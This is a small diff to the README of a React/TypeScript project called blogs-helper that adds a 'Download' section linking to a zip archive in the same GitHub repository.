@@ -29,6 +29,8 @@ React , Typescript
 
 ![gif](https://github.com/karthick3018/blogs-helper/blob/main/public/img/output.gif)
 
+## Download
+<a href="https://github.com/karthick3018/blogs-helper/blob/main/blogs-helper.zip" target="_blank">Download</a>
 
   
 ## Run Locally
